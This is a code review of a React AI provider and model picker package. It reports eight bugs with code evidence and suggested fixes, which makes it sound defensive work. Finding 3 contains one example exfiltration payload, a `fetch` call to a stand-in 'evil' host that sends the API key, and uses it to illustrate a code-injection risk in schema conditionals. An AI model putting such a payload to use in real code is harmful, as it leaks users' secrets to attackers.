# Cluster 9 Review — AI provider/model picker (`packages/ai-picker`)

Reviewed all 8 assigned files plus `registry.json`, the `@formedible/ui` primitives consumed (popover/button/input/select), and the Base UI implementations they wrap. `pnpm run check-types` passes on the package; the props/Base-UI API usage (Popover `render` prop, Select `value`/`onValueChange`, Button default `type="button"`) is all correct. The API key itself never touches localStorage/network from inside this package (persistence is delegated to the host via preferences) and is never logged — good. The findings below are the real problems.

### [SEVERITY: HIGH] Finding 1: Provider switch does not invalidate provider-scoped state — stale catalog from the previous provider keeps rendering wrong models
**File**: packages/ai-picker/src/components/ai-picker/ai-picker.tsx:113-116 (also 143-146, ai-picker-panel.tsx:104-136)
**Problem**: `effectiveCatalog` falls back to `fetchedCatalog` without checking `fetchedCatalog.provider` against the currently selected provider. `fetchedCatalog` is only ever set by `handleRefreshModels` for the provider active at fetch time and is never cleared when the user switches providers.
**Evidence**:
```ts
const effectiveCatalog = useMemo(
  () => modelCatalogProp ?? modelCatalogs?.[currentSettings.provider] ?? fetchedCatalog,
  [modelCatalogProp, modelCatalogs, currentSettings.provider, fetchedCatalog],
);
```
Panel's provider `onValueChange` (ai-picker-panel.tsx:115-121) resets `model` to the new provider default but nothing resets `fetchedCatalog` (and `apiKey` from the old provider is likewise kept and re-labeled under the new provider in `ProviderSecrets`).
**Impact**: With the flagship `onFetchModels` flow and no `modelCatalogs` prop, a user who refreshes models on OpenAI then switches to Anthropic sees OpenAI model IDs as autocomplete suggestions for Anthropic (plus the stale "Last refreshed ..." / error text), and can select e.g. `gpt-5.4-mini` as an Anthropic model — silently producing a broken AI config that passes `validateProviderAccess`. The previously-entered key also remains attached to the new provider's secrets.
**Suggestion**: Discard or key fetched catalogs by provider: `const effectiveCatalog = ... ?? (fetchedCatalog?.provider === currentSettings.provider ? fetchedCatalog : undefined)`, or clear `fetchedCatalog` in a effect on `currentSettings.provider` change. Consider clearing/flagging `apiKey` on provider switch since `ProviderSecrets.provider` changes meaning.

### [SEVERITY: MEDIUM] Finding 2: Generic schema-field branches hardcode `value=""` / `checked={false}` — any custom field added via `schema` override is non-functional
**File**: packages/ai-picker/src/components/ai-picker/ai-picker-panel.tsx:259-311
**Problem**: The fallback branches for custom fields (anything not matching the hardcoded names `provider`/`apiKey`/`model`/`storageMode`/`rememberKey`/`temperature`/`maxTokens`/`thinkingBudgetTokens`) render controlled inputs whose current value is hardcoded to empty/false instead of reading `values[field.name]`.
**Evidence**:
```tsx
if (fieldType === 'checkbox') {
  <input type="checkbox" checked={false} ... onChange={(event) => { onChange({ ...values, [field.name]: event.target.checked }); }} />
...
if (fieldType === 'number') {
  <Input value="" ... onChange={... values[field.name] = parseOptionalNumber(...)} />
...
  <Input value="" type={fieldType === 'password' ? 'password' : 'text'} ...
```
**Impact**: `mergePickerSchema` and the `schema` prop exist specifically to let hosts add/override fields, but any added checkbox can never display as checked (even when state says `true`), and any added text/number field resets to empty on every keystroke — the field visibly rejects input. State and UI desync immediately.
**Suggestion**: Read the current value: `checked={Boolean((values as Record<string, unknown>)[field.name])}` for checkbox, and `value={(values as Record<string, unknown>)[field.name] ?? ''}` for text/number (stringified for numbers).

### [SEVERITY: MEDIUM] Finding 3: `evaluateConditional` compiles schema strings with `new Function`, executing arbitrary JS with `values` (including the API key) in scope
**File**: packages/ai-picker/src/components/ai-picker/ai-picker-panel.tsx:45-56 (schema strings at default-picker-schema.ts:54,72)
**Problem**: Field visibility is evaluated by wrapping the `conditional` string in `new Function('values', 'return (...)(' + ... + ')')`. The evaluator receives the full `AiPickerValues` object, which contains `apiKey`, and runs on every render for every field.
**Evidence**:
```ts
const evaluator = new Function('values', `return (${conditional})(values)`) as (v: AiPickerValues) => boolean;
return evaluator(values);
```
**Impact**: If a schema is ever deserialized from storage or received over the network (this product family is built around schema-driven UI, and the sibling `packages/formedible` treats `conditional` strings as safe field paths — `getValueAtFieldPath` in `use-formedible.tsx:223-225`), a crafted `conditional` executes arbitrary code and can exfiltrate the API key (`fetch('//evil', {body: values.apiKey})`). It also diverges from the core package's convention. A malformed conditional silently hides the field (catch returns `false`) with no diagnostic.
**Suggestion**: Type `conditional` as `((values: AiPickerValues) => boolean) | string` and mirror the core semantics (function invoked directly; string resolved as a field path via truthiness), eliminating `new Function` entirely; at minimum, document that the schema must only come from trusted code.

### [SEVERITY: MEDIUM] Finding 4: `providerConfigs` and `onClearStoredSecrets` are declared in `AiPickerProps` but never read — dead public API
**File**: packages/ai-picker/src/lib/ai-picker-types.ts:114,117 (see ai-picker.tsx:73-87 where neither is destructured)
**Problem**: Both props are part of the exported interface but `AiPicker` never destructures them, never forwards them to the panel/popover, and no other code in the package references them (verified by grep — they appear only in the type declaration).
**Evidence**:
```ts
readonly providerConfigs?: readonly AiPickerProviderConfig[];
...
readonly onClearStoredSecrets?: () => void;
```
**Impact**: A host restricting providers via `providerConfigs` (e.g. only Anthropic) silently gets all three providers — the panel renders `defaultProviderConfigs` regardless. A host wiring "clear stored key" to `onClearStoredSecrets` gets a callback that can never fire because no UI invokes it, leaving users who chose `local` storage no in-component way to purge a stored key. This is an API contract violation, not just dead code, because the types promise behavior that does not exist.
**Suggestion**: Either implement both (thread `providerConfigs` into `resolveProviderDefaultModel`/`isAIProvider`/panel option defaults, add a "Clear stored key" affordance that calls `onClearStoredSecrets`), or remove them from `AiPickerProps` and the `AiPickerProviderConfig` export until the feature exists.

### [SEVERITY: MEDIUM] Finding 5: Controlled mode requires BOTH `settings` and `secrets` and is latched on first render — partial or late-arriving props are silently ignored
**File**: packages/ai-picker/src/components/ai-picker/ai-picker.tsx:88,96-97
**Problem**: `isControlled` is computed once (first render) as `settingsProp !== undefined && secretsProp !== undefined`. Passing only one of the two props makes the component fully uncontrolled (that prop is ignored), and props that arrive after mount (the natural pattern for this component — asynchronously restoring persisted settings/secrets from session/localStorage) are ignored forever.
**Evidence**:
```ts
const isControlled = useRef(settingsProp !== undefined && secretsProp !== undefined);
...
const currentSettings = isControlled.current ? settingsProp! : internalSettings;
const currentSecrets = isControlled.current ? secretsProp! : internalSecrets;
```
**Impact**: A host that loads the remembered key/settings async and then passes `settings`/`secrets` sees the picker permanently display internal defaults (default provider/model, empty key) while `onChange` keeps firing from that desynced state — the restored API key never appears in the input. A host passing `settings` without `secrets` (both individually optional in the type) silently loses control of both with no warning. This directly undermines the storage-restore flow the component's persistence preferences exist for.
**Suggestion**: Latch per-prop (`settingsProp !== undefined`, `secretsProp !== undefined`) or re-derive each render; at minimum, sync internal state when the props transition from undefined to defined (treat them as the source of truth once present), and/or split the type so the controlled pair must be passed together.

### [SEVERITY: MEDIUM] Finding 6: API key input uses `autoComplete="off"` — browsers widely ignore it on password-type fields, letting the key be saved to the password manager / autofilled
**File**: packages/ai-picker/src/components/ai-picker/ai-picker-panel.tsx:142-148
**Problem**: The API key field is `type="password"` with `autoComplete="off"`. Chrome/Safari/Firefox have a long, documented history of ignoring `off` for password inputs: they offer to save the value into the browser's password store (key persisted outside the app's storage-preference system, which defaults to memory-only) and may autofill the user's site credentials into the field.
**Evidence**:
```tsx
<Input
  value={values.apiKey}
  type="password"
  autoComplete="off"
  ...
```
**Impact**: The component goes to lengths to make key persistence opt-in (`storageMode: 'memory'` default, warning banner for `local`), yet the browser can persist the key into the password manager against the user's explicit "memory only" choice; autofill can also leak the user's actual website password into `values.apiKey`, which is then handed to `onFetchModels` and `onChange` (and potentially to the wrong AI provider after a provider switch).
**Suggestion**: Use `autoComplete="new-password"` (the standard signal for "do not save/autofill"), optionally with `spellCheck={false}`. This matches MDN/web.dev guidance for non-login secret fields.

### [SEVERITY: MEDIUM] Finding 7: `handleRefreshModels` swallows fetch errors and wipes the previously loaded catalog
**File**: packages/ai-picker/src/components/ai-picker/ai-picker.tsx:135-147
**Problem**: The catch handler sets `fetchedCatalog` to `undefined`, discarding both the error and any previously successful catalog, even though `ProviderModelCatalog` has a first-class `error` field that the panel renders (`modelCatalog?.error ? modelCatalog.error : ...` at ai-picker-panel.tsx:98).
**Evidence**:
```ts
onFetchModels(current.provider, current.apiKey)
  .then((catalog) => setFetchedCatalog(catalog))
  .catch(() => setFetchedCatalog(undefined))
  .finally(() => setIsFetching(false));
```
**Impact**: On a transient network failure (or a rejected key), the user gets zero feedback — the button just re-enables — and a previously fetched, still-valid model list plus its "Last refreshed" metadata is erased. The data model was designed to surface this (`error?: string`) and the implementation throws that capability away.
**Suggestion**: On failure, set `{ provider, models: [], fetchedAt: Date.now(), error: 'Failed to refresh models. Check your API key and connection.' }` (or preserve the prior catalog and surface the error separately), so the panel's existing error slot does its job.

### [SEVERITY: MEDIUM] Finding 8: Number fields are controlled by the parsed value — intermediate decimal input gets clobbered
**File**: packages/ai-picker/src/components/ai-picker/ai-picker-panel.tsx:24-31,208-257
**Problem**: `temperature`/`maxTokens`/`thinkingBudgetTokens` inputs are controlled with the already-parsed number (`value={values.temperature ?? ''}`) while `onChange` immediately parses (`parseOptionalNumber`). For `<input type="number">`, intermediate text like `"0."` is not a valid floating-point number, so `event.target.value` sanitizes to `""` (per the HTML spec's number sanitization) and `parseOptionalNumber('')` returns `undefined`; the re-render then snaps the field to empty, destroying the typed prefix. Equivalent clobbering happens whenever the raw text differs from the serialized number (e.g. trailing zeros).
**Evidence**:
```ts
function parseOptionalNumber(value: string): number | undefined {
  if (value.trim() === '') return undefined;
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : undefined;
}
...
<Input value={values.temperature ?? ''} type="number" min={field.min} max={field.max} step={field.step}
  onChange={(event) => onChange({ ...values, temperature: parseOptionalNumber(event.target.value) })} />
```
**Impact**: Temperature defaults to 0.7 with `step: 0.1` and a 0–2 range — decimals are the common case, yet typing `0.5` in natural order loses characters (the `0` is wiped when `.` is entered), forcing users into workarounds (type `5` then prepend `0.`). Same for `thinkingBudgetTokens` edits.
**Suggestion**: Keep the raw string in state while focused and parse on blur (or store a draft string per field and only commit the parsed number on blur/valid input), so intermediate input isn't round-tripped through `Number` → string on every keystroke.

## Non-findings (checked, not problems)
- Popover `render={<Button/>}` trigger: valid Base UI API; `useButton` defaults `type="button"` so no accidental form submission; panel's refresh button sets it explicitly.
- API key is never logged, never persisted by the package itself, and the input has no `name`, so it cannot leak via host form submission.
- `validateProviderAccess`'s `'thinkingBudgetTokens' in settings` check is safe for component-produced settings because `valuesToSettings` omits the key for non-Anthropic providers.
- Select `onValueChange` values are guarded by `isAIProvider`/`isStorageMode` before use; `null` handled.
- No SSR crashes: no window/localStorage access, all components `'use client'`.
- `mergePickerSchema` merge order/precedence is sane; default schema field names all map to real renderer branches (except by-design custom fields covered in Finding 2).
